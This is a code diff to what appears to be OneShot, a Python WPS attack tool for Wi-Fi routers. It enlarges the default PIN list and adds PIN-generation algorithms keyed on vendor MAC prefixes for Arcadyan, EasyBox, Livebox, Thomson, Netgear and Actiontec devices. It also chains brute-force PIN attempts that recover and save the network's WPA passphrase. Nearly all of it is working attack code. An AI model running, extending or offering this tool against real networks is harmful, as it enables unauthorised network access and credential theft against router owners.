@@ -15,7 +15,38 @@ import hashlib
 import argparse
 import select
 
-COMMON_PINS = ["", "12345670", "12345678", "00000000", "11111111", "78945670", "00005678", "99999999"]
+DEFAULT_PINS = [
+    "",
+    "12345670",
+    "12345678",
+    "00000000",
+    "11111111",
+    "78945670",
+    "00005678",
+    "99999999",
+    "78421783",
+    "20172527",
+    "46264848",
+    "76229909",
+    "62327145",
+    "10864111",
+    "31957199",
+    "30432031",
+    "71412252",
+    "68175542",
+    "95661469",
+    "95719115",
+    "48563710",
+    "20854836",
+    "43977680",
+    "05294176",
+    "99956042",
+    "35611530",
+    "67958146",
+    "34259283",
+    "94229882",
+    "95755212"
+]
 TRIED_PINS = set()
 
 
@@ -209,12 +240,16 @@ except Exception:
 
 class NetworkAddress:
     def __init__(self, mac):
+        self._serial = None
         if isinstance(mac, int):
             self._int_repr = mac
             self._str_repr = self._int2mac(mac)
         elif isinstance(mac, str):
-            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
-            self._int_repr = self._mac2int(mac)
+            mac, serial = self._split_mac_serial(mac)
+            self._serial = serial
+            mac_fmt = mac.replace('-', ':').replace('.', ':').strip().upper()
+            self._int_repr = self._mac2int(mac_fmt)
+            self._str_repr = self._int2mac(self._int_repr)
         else:
             raise ValueError('MAC address must be string or integer')
 
@@ -224,8 +259,11 @@ class NetworkAddress:
 
     @string.setter
     def string(self, value):
-        self._str_repr = value
-        self._int_repr = self._mac2int(value)
+        mac, serial = self._split_mac_serial(value)
+        mac_fmt = mac.replace('-', ':').replace('.', ':').strip().upper()
+        self._serial = serial
+        self._int_repr = self._mac2int(mac_fmt)
+        self._str_repr = self._int2mac(self._int_repr)
 
     @property
     def integer(self):
@@ -238,6 +276,14 @@ class NetworkAddress:
 
     def __int__(self):
         return self.integer
+
+    @property
+    def serial(self):
+        return self._serial
+
+    @serial.setter
+    def serial(self, value):
+        self._serial = value
 
     def __str__(self):
         return self.string
@@ -263,8 +309,18 @@ class NetworkAddress:
         return self.integer > other.integer
 
     @staticmethod
+    def _split_mac_serial(value):
+        if isinstance(value, str) and '#' in value:
+            mac, serial = value.split('#', 1)
+            return mac, serial.strip() or None
+        return value, None
+
+    @staticmethod
     def _mac2int(mac):
-        return int(mac.replace(':', ''), 16)
+        if isinstance(mac, str):
+            mac = mac.split('#', 1)[0]
+            mac = re.sub(r'[^0-9A-Fa-f]', '', mac)
+        return int(mac, 16)
 
     @staticmethod
     def _int2mac(mac):
@@ -274,8 +330,30 @@ class NetworkAddress:
         return mac
 
     def __repr__(self):
-        return 'NetworkAddress(string={}, integer={})'.format(
-            self._str_repr, self._int_repr)
+        return 'NetworkAddress(string={}, integer={}, serial={})'.format(
+            self._str_repr, self._int_repr, self._serial)
+
+
+def _split_bssid_serial(value: str):
+    if not value:
+        return '', None
+    if isinstance(value, str) and '#' in value:
+        mac, serial = value.split('#', 1)
+        return mac.strip(), serial.strip() or None
+    return value.strip(), None
+
+
+def canonical_bssid(bssid: str) -> str:
+    mac, _ = _split_bssid_serial(bssid)
+    mac_hex = re.sub(r'[^0-9A-Fa-f]', '', mac)
+    if len(mac_hex) != 12:
+        return mac.lower()
+    formatted = ':'.join(mac_hex[i:i+2] for i in range(0, 12, 2))
+    return formatted.lower()
+
+
+def bssid_storage_name(bssid: str) -> str:
+    return canonical_bssid(bssid).replace(':', '').upper()
 
 class WPSpin:
     """WPS pin generator"""
@@ -291,14 +369,19 @@ class WPSpin:
                       'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                       'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                       'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
+                      'pinArcadyan': {'name': 'Arcadyan (Belkin/Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinArcadyan},
+                      'pinEasyBox': {'name': 'Vodafone EasyBox (Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinEasyBox},
+                      'pinLivebox': {'name': 'Orange Livebox (Arcadyan)', 'mode': self.ALGO_MAC, 'gen': self.pinLivebox},
                       'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                       'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
+                      'pinActiontecQ1000': {'name': 'Actiontec Q1000', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                       'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                       'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                       'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                       'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                       'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                       'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
+                      'pinNetgearCG3000': {'name': 'Netgear CG3000 (Optus)', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                       'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                       'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                       'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
@@ -311,6 +394,7 @@ class WPSpin:
                       'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                       'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                       'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
+                      'pinThomsonTG782T': {'name': 'Thomson TG782T', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7842178},
                       'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                       'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                       'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}
@@ -424,8 +508,13 @@ class WPSpin:
             'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
             'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
             'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
+            'pinArcadyan': ('38229D', '402CF4', 'C83A35', 'EC1A59', 'EC233D', 'F8D111'),
+            'pinEasyBox': ('001A2A', '002240', '00224D', 'C83A35', 'EC233D'),
+            'pinLivebox': ('A0F3C1', 'D86CE9', 'EC1A59', 'F80D60'),
             'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
             'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
+            'pinActiontecQ1000': ('0015A8', '00236C', '00E0FC'),
+            'pinNetgearCG3000': ('00184D', '001E2A', '0024B2'),
             'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
             'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
             'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
@@ -444,6 +533,7 @@ class WPSpin:
             'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
             'pinEdimax': ('801F02', '00E04C'),
             'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
+            'pinThomsonTG782T': ('001D68', '001F9F', '00247F'),
             'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
             'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
             'pinONO': ('5C353B', 'DC537C')
@@ -497,6 +587,53 @@ class WPSpin:
         + (((b[1] + b[2]) % 10) * 100000)\
         + (((b[0] + b[1]) % 10) * 1000000)
         return pin
+
+    @staticmethod
+    def _mac_nibbles(mac):
+        mac_hex = mac.string.replace(':', '')
+        return [int(h, 16) for h in mac_hex]
+
+    def _arcadyan_serial_suffix(self, mac):
+        digits = []
+        if mac.serial:
+            digits = [int(ch) for ch in mac.serial if ch.isdigit()]
+        fallback = [int(ch) for ch in f"{mac.integer & 0xFFFFFF:05d}"]
+        if digits:
+            digits = (fallback + digits)[-5:]
+        else:
+            digits = fallback
+        if len(digits) < 5:
+            digits = ([0] * (5 - len(digits))) + digits
+        return digits[-5:]
+
+    def _arcadyan_pin(self, mac):
+        nibbles = self._mac_nibbles(mac)
+        if len(nibbles) != 12:
+            raise ValueError('Invalid MAC format for Arcadyan algorithm')
+        serial_suffix = self._arcadyan_serial_suffix(mac)
+        serial_digits = [0] * 10
+        serial_digits[5:] = serial_suffix
+        k1 = (serial_digits[6] + serial_digits[7] + nibbles[10] + nibbles[11]) & 0xF
+        k2 = (serial_digits[8] + serial_digits[9] + nibbles[8] + nibbles[9]) & 0xF
+        hpin = [0] * 7
+        hpin[0] = k1 ^ serial_digits[9]
+        hpin[1] = k1 ^ serial_digits[8]
+        hpin[2] = k2 ^ nibbles[9]
+        hpin[3] = k2 ^ nibbles[10]
+        hpin[4] = nibbles[10] ^ serial_digits[9]
+        hpin[5] = nibbles[11] ^ serial_digits[8]
+        hpin[6] = k1 ^ serial_digits[7]
+        pin = int(''.join(f"{x:X}" for x in hpin), 16)
+        return pin % 10000000
+
+    def pinArcadyan(self, mac):
+        return self._arcadyan_pin(mac)
+
+    def pinEasyBox(self, mac):
+        return self._arcadyan_pin(mac)
+
+    def pinLivebox(self, mac):
+        return self._arcadyan_pin(mac)
 
 def recvuntil(pipe, what):
     s = ''
@@ -558,24 +695,28 @@ class Companion:
         self.save_result = save_result
         self.print_debug = print_debug
 
-        self.tempdir = tempfile.mkdtemp()
-        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
+        self.base_dir = pathlib.Path.cwd()
+
+        self.tempdir = tempfile.mkdtemp(prefix='oneshot-', dir=str(self.base_dir))
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False, dir=self.tempdir) as temp:
             temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
             self.tempconf = temp.name
         self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
         self.__init_wpa_supplicant()
 
-        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
+        sock_fd, sock_path = tempfile.mkstemp(prefix='oneshot-sock-', dir=self.tempdir)
+        os.close(sock_fd)
+        os.unlink(sock_path)
+        self.res_socket_file = sock_path
         self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
         self.retsock.bind(self.res_socket_file)
 
         self.pixie_creds = PixiewpsData()
         self.connection_status = ConnectionStatus()
 
-        user_home = str(pathlib.Path.home())
-        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
-        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
-        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
+        self.sessions_dir = str(self.base_dir / 'sessions')
+        self.pixiewps_dir = str(self.base_dir / 'pixiewps')
+        self.reports_dir = str(self.base_dir / 'reports')
         if not os.path.exists(self.sessions_dir):
             os.makedirs(self.sessions_dir)
         if not os.path.exists(self.pixiewps_dir):
@@ -583,7 +724,7 @@ class Companion:
 
         self.generator = WPSpin()
 
-        self.bssid = bssid
+        self.bssid = canonical_bssid(bssid)
         self.lastPwr = 0
 
     def __init_wpa_supplicant(self):
@@ -758,7 +899,7 @@ class Companion:
     def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
         if not os.path.exists(self.reports_dir):
             os.makedirs(self.reports_dir)
-        filename = self.reports_dir + 'stored'
+        filename = os.path.join(self.reports_dir, 'stored')
         dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
         with open(filename + '.txt', 'a', encoding='utf-8') as file:
             file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
@@ -774,15 +915,19 @@ class Companion:
         print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
 
     def __savePin(self, bssid, pin):
-        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+        storage_id = bssid_storage_name(bssid)
+        if not storage_id:
+            return
+        filename = os.path.join(self.pixiewps_dir, f'{storage_id}.run')
         with open(filename, 'w') as file:
             file.write(pin)
         print('[i] PIN saved in {}'.format(filename))
 
     def __prompt_wpspin(self, bssid):
         pins = self.generator.getSuggested(bssid)
+        display_bssid = canonical_bssid(bssid).upper() or bssid
         if len(pins) > 1:
-            print(f'PINs generated for {bssid}:')
+            print(f'PINs generated for {display_bssid}:')
             print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
             for i, pin in enumerate(pins):
                 number = '{})'.format(i + 1)
@@ -814,17 +959,19 @@ class Companion:
         self.pixie_creds.clear()
         self.connection_status.clear()
         self.wpas.stdout.read(300)
-        self.bssid = (bssid or '').lower()
+        target_bssid = canonical_bssid(bssid)
+        self.bssid = target_bssid
+        display_bssid = target_bssid.upper()
         if pbc_mode:
-            if bssid:
-                print(f"[*] Starting WPS push button connection to {bssid}…")
-                cmd = f'WPS_PBC {bssid}'
+            if target_bssid:
+                print(f"[*] Starting WPS push button connection to {display_bssid}…")
+                cmd = f'WPS_PBC {target_bssid}'
             else:
                 print("[*] Starting WPS push button connection…")
                 cmd = 'WPS_PBC'
         else:
             print(f"[*] Trying PIN {pin}...")
-            cmd = f'WPS_REG {bssid} {pin}'
+            cmd = f'WPS_REG {target_bssid} {pin}'
 
         r = self.sendAndReceive(cmd)
         if 'OK' not in r:
@@ -850,10 +997,14 @@ class Companion:
 
     def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, pixieforce=False,
                           store_pin_on_fail=False):
+        storage_id = bssid_storage_name(bssid)
+
         if pin is None:
             if pixiemode:
                 try:
-                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
+                    if not storage_id:
+                        raise FileNotFoundError
+                    filename = os.path.join(self.pixiewps_dir, f'{storage_id}.run')
                     with open(filename, 'r') as file:
                         t_pin = file.readline().strip()
                         if user_input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
@@ -870,17 +1021,20 @@ class Companion:
             pin = '<PBC mode>'
         else:
             self.__wps_connection(bssid, pin, pixiemode)
+            bssid = self.connection_status.bssid or canonical_bssid(bssid)
+            storage_id = bssid_storage_name(bssid)
 
         if self.connection_status.status == 'GOT_PSK':
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
             if self.save_result:
                 self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
             if not pbc_mode:
-                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
-                try:
-                    os.remove(filename)
-                except FileNotFoundError:
-                    pass
+                if storage_id:
+                    filename = os.path.join(self.pixiewps_dir, f'{storage_id}.run')
+                    try:
+                        os.remove(filename)
+                    except FileNotFoundError:
+                        pass
             return True
         elif pixiemode:
             if self.pixie_creds.got_all():
@@ -1322,11 +1476,13 @@ if __name__ == '__main__':
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
+    force_loop = args.loop or args.push_button_connect
+
     while True:
         check_exit()
         companion = Companion(args.interface, args.write, print_debug=args.verbose)
         if args.push_button_connect:
-            companion.single_connection(pbc_mode=True)
+            companion.single_connection(args.bssid, pbc_mode=True)
         else:
             essid = None
             network = None
@@ -1351,15 +1507,15 @@ if __name__ == '__main__':
                             companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
                         if companion.connection_status.status != 'GOT_PSK':
                             if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid), delay=args.delay):
-                                if not try_pin_sequence(companion, args.bssid, COMMON_PINS, delay=args.delay):
+                                if not try_pin_sequence(companion, args.bssid, DEFAULT_PINS, delay=args.delay):
                                     pins = generate_pins(mac=args.bssid, ssid=essid)
                                     if not try_pin_sequence(companion, args.bssid, pins, delay=args.delay):
                                         if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p], delay=args.delay):
                                             if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p], delay=args.delay):
                                                 print('[-] All PIN attempts failed')
-        if not args.loop:
+        if not force_loop:
             break
-        else:
+        if args.loop:
             args.bssid = None
 
     if args.iface_down:
